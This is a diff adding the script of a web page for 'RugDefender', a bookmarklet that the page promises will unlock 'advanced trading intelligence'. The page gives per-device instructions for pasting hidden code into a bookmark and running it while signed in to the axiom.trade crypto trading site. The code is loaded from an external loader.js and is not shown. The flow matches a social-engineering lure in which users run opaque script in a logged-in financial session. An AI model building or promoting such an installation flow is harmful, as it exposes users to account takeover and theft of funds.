+                const r = (bigint >> 16) & 255;
+                const g = (bigint >> 8) & 255;
+                const b = bigint & 255;
+
+                return { r, g, b };
+            }
+
+            function initStars() {
+                stars = [];
+                for (let i = 0; i < starCount; i++) {
+                    stars.push({
+                        x: (Math.random() - 0.5) * 2 * canvas.width,
+                        y: (Math.random() - 0.5) * 2 * canvas.height,
+                        z: Math.random() * canvas.width,
+                        speed: Math.random() * 3 + 1
+                    });
+                }
+            }
+
+            function drawStar(star) {
+                const scale = perspective / (perspective + star.z);
+                const x2d = canvas.width / 2 + star.x * scale;
+                const y2d = canvas.height / 2 + star.y * scale;
+                const size = Math.max(scale * 3, 0.5);
+
+                const prevScale = perspective / (perspective + star.z + star.speed * 15);
+                const xPrev = canvas.width / 2 + star.x * prevScale;
+                const yPrev = canvas.height / 2 + star.y * prevScale;
+
+                const rgb = hexToRgb(starColor);
+
+                // Draw blurred trail
+                ctx.save();
+                ctx.strokeStyle = `rgba(${rgb.r}, ${rgb.g}, ${rgb.b}, 0.15)`;
+                ctx.lineWidth = size * 2.5;
+                ctx.shadowBlur = 25;
+                ctx.shadowColor = `rgba(${rgb.r}, ${rgb.g}, ${rgb.b}, 0.6)`;
+                ctx.beginPath();
+                ctx.moveTo(x2d, y2d);
+                ctx.lineTo(xPrev, yPrev);
+                ctx.stroke();
+                ctx.restore();
+
+                // Draw sharp line
+                ctx.strokeStyle = `rgba(${rgb.r}, ${rgb.g}, ${rgb.b}, 0.4)`;
+                ctx.lineWidth = size;
+                ctx.beginPath();
+                ctx.moveTo(x2d, y2d);
+                ctx.lineTo(xPrev, yPrev);
+                ctx.stroke();
+
+                // Draw star dot
+                ctx.fillStyle = `rgba(${rgb.r}, ${rgb.g}, ${rgb.b}, 0.8)`;
+                ctx.beginPath();
+                ctx.arc(x2d, y2d, size / 4, 0, Math.PI * 2);
+                ctx.fill();
+            }
+
+            function animate() {
+                ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+                stars.forEach(star => {
+                    drawStar(star);
+
+                    star.z -= star.speed;
+
+                    if (star.z <= 0) {
+                        star.z = canvas.width;
+                        star.x = (Math.random() - 0.5) * 2 * canvas.width;
+                        star.y = (Math.random() - 0.5) * 2 * canvas.height;
+                    }
+                });
+
+                requestAnimationFrame(animate);
+            }
+
+            window.addEventListener('resize', () => {
+                resizeCanvas();
+                initStars();
+            });
+
+            resizeCanvas();
+            initStars();
+            animate();
+        }
+
+        function detectDevice() {
+            const userAgent = navigator.userAgent;
+            
+            if (/iPad|iPhone|iPod/.test(userAgent)) {
+                if (/Safari/.test(userAgent) && !/CriOS|FxiOS|EdgiOS/.test(userAgent)) {
+                    return 'ios-safari';
+                } else {
+                    return 'ios-chrome'; // Chrome, Firefox, or other browsers on iOS
+                }
+            } else if (/Android/.test(userAgent)) {
+                // Check if it's Chrome, Firefox, or other browser on Android
+                if (/Chrome/.test(userAgent) && !/EdgA/.test(userAgent)) {
+                    return 'android-chrome';
+                } else if (/Firefox/.test(userAgent)) {
+                    return 'android-firefox';
+                } else {
+                    return 'android-chrome'; 
+                }
+            } else if (/Macintosh|Mac OS X/.test(userAgent)) {
+                return 'mac';
+            } else {
+                return 'windows'; 
+            }
+        }
+
+        function getDeviceSpecificContent(device) {
+            const contents = {
+                'ios-safari': {
+                    title: '✅ iOS Safari Installation (Recommended)',
+                    content: 'Tap the share button, scroll down to "Add Bookmark", then edit the bookmark to paste the copied code.',
+                    shortcut: null,
+                    copyToClipboard: true,
+                    videoId: 'wx972GObb1M', // iOS Safari tutorial video
+                    steps: [
+                        { title: 'Tap to Copy Code', description: 'Tap the "Tap to Copy Code" button to copy the bookmarklet to your clipboard.' },
+                        { title: 'Tap Share Button', description: 'Tap the share button (square with arrow pointing up) in Safari.' },
+                        { title: 'Add Bookmark', description: 'Scroll down and tap "Add Bookmark" <img src="https://i.ibb.co/xKK11W6r/book.png" alt="book icon" style="width:16px;height:16px;vertical-align:middle;">.' },
+                        { title: 'Edit Bookmark', description: 'Tap "Edit", change the name to "RugDefender", then double-tap the URL field.' },
+                        { title: 'Paste & Save', description: 'Paste the copied code to replace the URL, then tap "Save".' },
+                        { title: 'Navigate to Axiom', description: 'Go to axiom.trade in Safari and sign in to your account.' },
+                        { title: 'Activate RugDefender', description: 'Tap your saved RugDefender bookmark to instantly unlock advanced trading intelligence.' }
+                    ]
+                },
+                'ios-chrome': {
+                    title: '⚠️ iOS Chrome/Firefox - Use Safari Instead',
+                    content: 'Chrome and Firefox on iOS don\'t support bookmarklets for security reasons. Please use Safari for the best experience.',
+                    shortcut: null,
+                    copyToClipboard: false,
+                    videoId: 'wx972GObb1M', // Use Safari tutorial video
+                    steps: [
+                        { title: '⚠️ Bookmarklet Limitation', description: 'Chrome, Firefox, and other browsers on iOS cannot run JavaScript bookmarklets due to security restrictions.' },
+                        { title: '📱 Switch to Safari', description: 'Open Safari on your iPhone/iPad for full RugDefender support.' },
+                        { title: '🔄 Copy Code Again', description: 'Return to this page in Safari and tap "Tap to Copy Code" to copy the bookmarklet.' },
+                        { title: '📤 Use Share Button', description: 'In Safari, tap the share button (square with arrow pointing up).' },
+                        { title: '📖 Add Bookmark', description: 'Scroll down and tap "Add Bookmark" <img src="https://i.ibb.co/xKK11W6r/book.png" alt="book icon" style="width:16px;height:16px;vertical-align:middle;">.' },
+                        { title: '✏️ Edit & Paste', description: 'Tap "Edit", change name to "RugDefender", double-tap URL field, and paste the code.' },
+                        { title: '🚀 Activate on Axiom', description: 'Go to axiom.trade in Safari and tap your RugDefender bookmark to activate.' }
+                    ]
+                },
+                'android-chrome': {
+                    title: '⚠️ Android Chrome - Use Firefox Instead', 
+                    content: 'Chrome on Android doesn\'t support bookmarklets. Please install and use Firefox for full RugDefender functionality.',
+                    shortcut: null,
+                    copyToClipboard: false,
+                    videoId: 'jRxm35Qjyeg', // Android Firefox tutorial video
+                    steps: [
+                        { title: '⚠️ Chrome Limitation', description: 'Google Chrome removed bookmarklet support on Android for security reasons and cannot run RugDefender.' },
+                        { title: '🦊 Install Firefox', description: 'Download Firefox from the Google Play Store - it still supports bookmarklets on Android.' },
+                        { title: '🔄 Open This Page in Firefox', description: 'Once Firefox is installed, open this RugDefender page in Firefox instead of Chrome.' },
+                        { title: '📋 Copy Code in Firefox', description: 'Tap "Tap to Copy Code" to copy the bookmarklet to your clipboard.' },
+                        { title: '🌐 Navigate to Axiom', description: 'Go to axiom.trade in Firefox and bookmark the page first.' },
+                        { title: '⭐ Add Initial Bookmark', description: 'Tap ⋮ menu → "Add to bookmarks" (star icon).' },
+                        { title: '📁 Manage Bookmarks', description: 'Tap ⋮ menu → "Bookmarks" (folder icon), then long-press "RugDefender" to edit.' },
+                        { title: '📝 Paste & Save', description: 'Replace the URL with the copied bookmarklet code and save.' }
+                    ]
+                },
+                'android-firefox': {
+                    title: '✅ Android Firefox Installation (Recommended)', 
+                    content: 'Tap the ⋮ menu → Add to bookmarks, then manage bookmarks to edit and paste the copied code.',
+                    shortcut: null,
+                    copyToClipboard: true,
+                    videoId: 'jRxm35Qjyeg', // Android Firefox tutorial video
+                    steps: [
+                        { title: 'Tap to Copy Code', description: 'Tap the "Tap to Copy Code" button to copy the bookmarklet to your clipboard.' },
+                        { title: 'Navigate to Axiom', description: 'Go to axiom.trade in Firefox first to bookmark the page.' },
+                        { title: 'Add Initial Bookmark', description: 'Tap the ⋮ (menu) button in the toolbar, then tap "Add to bookmarks" (star icon).' },
+                        { title: 'View Bookmarks', description: 'Tap the ⋮ (menu) button again, then select "Bookmarks" (folder icon).' },
+                        { title: 'Edit Bookmark', description: 'Find and long-press the "RugDefender" bookmark to edit it.' },
+                        { title: 'Paste Code', description: 'Replace the URL with the copied bookmarklet code and save.' },
+                        { title: 'Activate RugDefender', description: 'Tap the edited RugDefender bookmark to activate the tool.' }
+                    ]
+                },
+                mac: {
+                    title: 'macOS Installation',
+                    content: 'Drag this button to your bookmarks bar (press ⌘ + Shift + B if hidden) then click the bookmarklet while on Axiom to activate RugDefender.',
+                    shortcut: '⌘ + Shift + B',
+                    copyToClipboard: false,
+                    videoId: 'PvArCev1gXU', // Desktop tutorial video (same as Windows)
+                    steps: [
+                        { title: 'Show Bookmarks Bar', description: 'Press ⌘ + Shift + B to show your bookmarks bar if it\'s hidden.' },
+                        { title: 'Drag the Bookmarklet', description: 'Drag the "Drag me to Start" button to your bookmarks bar. No downloads required.' },
+                        { title: 'Navigate to Axiom', description: 'Go to axiom.trade and sign in to your account as usual.' },
+                        { title: 'Find Your Bookmark', description: 'You may need to click the » button on the right side of the bookmarks bar to view all bookmarks.' },
+                        { title: 'Activate RugDefender', description: 'Click the bookmarklet to instantly unlock advanced trading intelligence.' }
+                    ]
+                },
+                windows: {
+                    title: 'Windows Installation',
+                    content: 'Drag this button to your bookmarks bar (press Ctrl + Shift + B if hidden) then click the bookmarklet while on Axiom to activate RugDefender.',
+                    shortcut: 'Ctrl + Shift + B',
+                    copyToClipboard: false,
+                    videoId: 'PvArCev1gXU', // Current desktop tutorial video
+                    steps: [
+                        { title: 'Show Bookmarks Bar', description: 'Press Ctrl + Shift + B to show your bookmarks bar if it\'s hidden.' },
+                        { title: 'Drag the Bookmarklet', description: 'Drag the "Drag me to Start" button to your bookmarks bar. No downloads required.' },
+                        { title: 'Navigate to Axiom', description: 'Go to axiom.trade and sign in to your account as usual.' },
+                        { title: 'Activate RugDefender', description: 'Click the bookmarklet to instantly unlock advanced trading intelligence.' }
+                    ]
+                }
+            };
+            
+            return contents[device] || contents.windows;
+        }
+
+        function copyToClipboard(text) {
+            if (navigator.clipboard && window.isSecureContext) {
+                return navigator.clipboard.writeText(text);
+            } else {
+                // Fallback for older browsers
+                const textArea = document.createElement('textarea');
+                textArea.value = text;
+                textArea.style.position = 'fixed';
+                textArea.style.left = '-999999px';
+                textArea.style.top = '-999999px';
+                document.body.appendChild(textArea);
+                textArea.focus();
+                textArea.select();
+                return new Promise((resolve, reject) => {
+                    document.execCommand('copy') ? resolve() : reject();
+                    textArea.remove();
+                });
+            }
+        }
+
+        function updateVideoAndSteps() {
+            const device = detectDevice();
+            const content = getDeviceSpecificContent(device);
+            
+            const videoIframe = document.querySelector('.video-container iframe');
+            if (videoIframe && content.videoId) {
+                videoIframe.src = `https://www.youtube.com/embed/${content.videoId}`;
+                videoIframe.title = `RugDefender ${device.charAt(0).toUpperCase() + device.slice(1)} Tutorial`;
+            }
+
+            const tutorialSteps = document.querySelector('.tutorial-steps');
+            if (tutorialSteps && content.steps) {
+                tutorialSteps.innerHTML = '';
+                
+                content.steps.forEach((step, index) => {
+                    const stepElement = document.createElement('div');
+                    stepElement.className = 'step-item';
+                    stepElement.innerHTML = `
+                        <div class="step-number">${index + 1}</div>
+                        <div class="step-content">
+                            <h4>${step.title}</h4>
+                            <p>${step.description}</p>
+                        </div>
+                    `;
+                    tutorialSteps.appendChild(stepElement);
+                });
+            }
+
+            // Update tutorial link to open device-specific video
+            const tutorialLink = document.getElementById('tutorialLink');
+            if (tutorialLink && content.videoId) {
+                tutorialLink.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    window.open(`https://www.youtube.com/watch?v=${content.videoId}`, '_blank');
+                });
+            }
+        }
+
+        function updatePopupContent() {
+            const device = detectDevice();
+            const content = getDeviceSpecificContent(device);
+            
+            // Update popup title
+            const popupTitle = document.querySelector('.popup-title');
+            if (popupTitle) {
+                popupTitle.innerHTML = content.title;
+            }
+
+            const popupContent = document.querySelector('.popup-content');
+            if (popupContent) {
+                let contentHTML = content.content;
+                
+                if (content.shortcut && !content.copyToClipboard) {
+
+                    contentHTML = contentHTML.replace(
+                        content.shortcut === '⌘ + Shift + B' ? '⌘ + Shift + B' : 'Ctrl + Shift + B',
+                        `<span class="keyboard-shortcut">${content.shortcut}</span>`
+                    );
+                }
+                
+                popupContent.innerHTML = contentHTML;
+            }
+            
+
+            const bookmarkletButtons = document.querySelectorAll('.bookmarklet');
+            if (content.copyToClipboard) {
+                bookmarkletButtons.forEach(button => {
+                    if (button.textContent.includes('Drag me')) {
+                        button.textContent = 'Tap to Copy Code';
+                    }
+                });
+            }
+            
+            // Add click handler for mobile devices to copy bookmarklet code
+            if (content.copyToClipboard) {
+                // Get the actual bookmarklet code from the desktop version
+                const getBookmarkletCode = () => {
+                    const desktopBookmarklet = document.querySelector('a.bookmarklet');
+                    return desktopBookmarklet ? desktopBookmarklet.href : '';
+                };
+                const bookmarkletCode = getBookmarkletCode();
+                
+                bookmarkletButtons.forEach(button => {
+                    button.addEventListener('click', function(e) {
+                        e.preventDefault();
+                        copyToClipboard(bookmarkletCode).then(() => {
+                            const originalText = this.textContent;
+                            this.textContent = 'Copied! Now paste in bookmarks';
+                            this.style.background = 'var(--accent-success)';
+                            
+                            setTimeout(() => {
+                                this.textContent = originalText;
+                                this.style.background = '';
+                            }, 3000);
+                        }).catch(err => {
+                            console.error('Failed to copy: ', err);
+                            alert('Copy this code to your bookmarks:\n\n' + bookmarkletCode);
+                        });
+                    });
+                });
+            }
+        }
+
+        // Initialize everything when page loads
+        window.addEventListener('load', function() {
+            initBoxReveal();
+            initAnimations();
+            initSearch();
+            initTicker(); // Call initTicker here
+            initStarfield();
+            
+            // Wait for loader.js to initialize bookmarklets, then update mobile content
+            setTimeout(() => {
+                updatePopupContent(); // Add device-specific popup content
+                updateVideoAndSteps(); // Add device-specific video and tutorial steps
+            }, 100);
+        });
+    </script>
+    <script src="js/loader.js" data="e30="></script>
+
+
+</body></html>
